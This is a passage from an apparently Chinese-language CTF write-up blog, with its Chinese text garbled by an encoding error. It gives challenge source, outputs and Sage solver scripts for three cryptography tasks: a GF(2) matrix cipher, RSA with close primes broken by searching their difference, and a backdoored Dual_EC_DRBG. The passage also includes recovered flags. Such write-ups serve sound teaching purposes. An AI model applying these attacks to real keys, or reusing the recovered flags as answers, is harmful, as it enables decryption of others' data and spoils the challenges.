class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line">PP = zero_matrix(GF(<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    PP[k] = [<span class="number">1</span> <span class="keyword">if</span> x <span class="keyword">in</span> P[k] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">PPt = PP.transpose()</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;</span></span><br><span class="line">C = zero_matrix(GF(<span class="number">2</span>),<span class="number">8</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">32</span>):</span><br><span class="line">    C[k//<span class="number">32</span>] = [<span class="number">1</span> <span class="keyword">if</span> x == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> c[k:k+<span class="number">32</span>]]</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">f0 = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">b&#x27;flag&#x27;</span>.<span class="built_in">hex</span>(),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">4</span>*<span class="number">8</span>)))</span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">tmp = C[<span class="number">0</span>] - (f0*(PPt^<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    l = <span class="built_in">list</span>((C[k]-tmp)*PPt^(-<span class="number">6</span>))</span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l]),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ä¸­å­¦æ•°å­¦"><a href="#ä¸­å­¦æ•°å­¦" class="headerlink" title="ä¸­å­¦æ•°å­¦"></a>ä¸­å­¦æ•°å­¦</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: flag{xxx}</p><p>Zuni: å¬è¯´å¯†ç å­¦æ˜¯å°å­¦æ•°å­¦æ¥ç€ï¼Ÿ</p><p>// éšç¼˜è¯„ï¼šçœŸçš„å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ æ¥è¿‘ï¼Œä¸”å‰1024-500ä½ç›¸åŒï¼Œæœ‰ $\sqrt{n}&gt;&gt;500 \approx p&gt;&gt;500 \approx q-p$ï¼Œæ•…å¯çˆ†ç ´æ‰¾å·®å€¼ $k$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">f1, f2</span>):</span></span><br><span class="line">g = f1.resultant(f2, q)</span><br><span class="line">roots = g.univariate_polynomial().roots()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">xh = x &gt;&gt; <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">1000000</span>,<span class="number">10000000</span>):</span><br><span class="line">    d = xh - k</span><br><span class="line">    P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = n - p*q</span><br><span class="line">    f2 = d - (q - p)</span><br><span class="line">    res = solve(f1, f2)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 5476332</span></span><br><span class="line"><span class="comment"># (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911)</span></span><br></pre></td></tr></table></figure><p>å†å¸¸è§„è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="bd-key"><a href="#bd-key" class="headerlink" title="bd_key"></a>bd_key</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx}</p><p>master of pwnä¸€ä¸‹å°±è§£å‡ºäº†æ˜æ–‡ï¼Œå› ä¸ºæœ‰åé—¨ï¼ˆæœ¬é¢˜ä¸pwnæ— å…³ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> Note: I have modified Dual_EC a little bit.</span></span><br><span class="line"><span class="string">    It would be EASIER for you to exploit it.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dual_EC</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, s_0=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># Init curve P-256</span></span><br><span class="line">        self.p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">        self.n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">        self.b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line">        self.curve = EllipticCurve(GF(self.p), [-<span class="number">3</span>, self.b])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init P, Q</span></span><br><span class="line">        self.Qx = <span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span></span><br><span class="line">        self.Qy = <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span></span><br><span class="line">        self.Q = self.curve(self.Qx, self.Qy)</span><br><span class="line">        self.d = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = self.d * self.Q      </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init state, h_adin</span></span><br><span class="line">        <span class="keyword">if</span> s_0 == <span class="literal">None</span>:</span><br><span class="line">            self.s_i = <span class="built_in">int</span>(floor((<span class="number">2</span>^<span class="number">16</span>-<span class="number">1</span>)*random()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.s_i = s_0</span><br><span class="line">        self.h_adin = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        self.__leak_par()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__leak_par</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;curve = <span class="subst">&#123;self.curve&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;self.P&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;self.d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;self.Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output 32bytes now.          </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__Dual_EC_DRBG</span>(<span class="params">self, h_adin = <span class="number">0</span></span>):</span> </span><br><span class="line">        t_i = self.s_i ^^ h_adin</span><br><span class="line">        self.s_i = (t_i*self.P)[<span class="number">0</span>].lift()</span><br><span class="line">        r_i = (self.s_i*self.Q)[<span class="number">0</span>].lift()</span><br><span class="line">        <span class="keyword">return</span> r_i</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getRandomNBytes</span>(<span class="params">self, N:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        req = (N/<span class="number">32</span>).ceil()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(req):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG(self.h_adin)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG()</span><br><span class="line"></span><br><span class="line">        self.s_i = (self.s_i * self.P)[<span class="number">0</span>].lift()</span><br><span class="line"></span><br><span class="line">        result = result &gt;&gt; ((<span class="number">32</span>*req - N)*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(result)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_flag</span>(<span class="params">key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">    <span class="keyword">from</span> FLAG3 <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag_pad = pad(flag, <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(flag_pad)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_schnorr_identification</span>(<span class="params">dbrg</span>):</span></span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    g = Zp(<span class="number">2</span>)</span><br><span class="line">    q = g.multiplicative_order()</span><br><span class="line">    Zq = Zmod(q)</span><br><span class="line">    k = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SchnorrProver</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.secret_key = Zq.random_element()</span><br><span class="line">            self.public_key = g^self.secret_key</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">commit</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.r = Zq.random_element()</span><br><span class="line">            <span class="keyword">return</span> g^self.r</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">respond</span>(<span class="params">self, challenge</span>):</span></span><br><span class="line">            <span class="keyword">return</span> self.r - challenge*self.secret_key</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SchnorrVerifier</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, prover_public_key</span>):</span></span><br><span class="line">            self.prover_public_key = prover_public_key</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">self, commitment</span>):</span></span><br><span class="line">            self.commitment = commitment</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                c = bytes_to_long(dbrg.getRandomNBytes(<span class="number">32</span>))</span><br><span class="line">                <span class="keyword">if</span> c &lt; p:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.challenge_number = c</span><br><span class="line">            <span class="keyword">return</span> self.challenge_number</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, response</span>):</span></span><br><span class="line">            check_value = g^response*self.prover_public_key^self.challenge_number</span><br><span class="line">            <span class="keyword">return</span> self.commitment == check_value</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_protocol</span>(<span class="params">iterations=<span class="number">1</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(iterations):</span><br><span class="line">            prover = SchnorrProver()</span><br><span class="line">            verifier = SchnorrVerifier(prover.public_key)</span><br><span class="line">            t = prover.commit()</span><br><span class="line">            c = verifier.challenge(t)</span><br><span class="line">            s = prover.respond(c)</span><br><span class="line">            <span class="keyword">assert</span>(verifier.check(s))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    run_protocol()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    dbrg = Dual_EC()</span><br><span class="line">    do_schnorr_identification(dbrg)</span><br><span class="line">    key = dbrg.getRandomNBytes(<span class="number">16</span>)</span><br><span class="line">    ct = encrypt_flag(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;bytes_to_long(ct)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951</span><br><span class="line"># P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)</span><br><span class="line"># d = 66604141534275704476445937214374130642068729921454877238730830814793201802544</span><br><span class="line"># Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)</span><br><span class="line"># c = 59100197418944667413449341413044666843726352095054393072750502893110293231642</span><br><span class="line"># ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><br></pre></td></tr></table></figure></blockquote><p>åŒæ¤­åœ†æ›²çº¿ç¡®å®šæ€§éšæœºæ•°å‘ç”Ÿå™¨ï¼ˆDual_EC_DRBGï¼‰çš„ä¸€ä¸ªåé—¨ï¼ŒåŸç†ï¼š</p><p>è®¾æ¯ä¸€æ­¥çš„ $\text{state}$ ä¸º $s_i$ï¼Œéšæœºæ•°ä¸º $r_i$ï¼Œéšæœºæ•°å¯¹åº”çš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ä¸º $R_i$ã€‚</p><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå·²çŸ¥ $P$ã€$Q$ã€$d$ã€$r_{i-1}$ï¼Œè€Œ $s_i$ æœªçŸ¥ã€‚äºæ˜¯æœ‰ï¼š</p><p>$\begin{cases} ((s_i \cdot P)_x \cdot P)_x &amp; \rightarrow s_{i+1} \newline ((s_i \cdot P)_x \cdot Q)_x &amp; \rightarrow r_i \end{cases}$</p><p>åé—¨ä¸ºæ„é€  $d \cdot r_{i-1}$ï¼Œå…¶æ°å¥½æ˜¯ 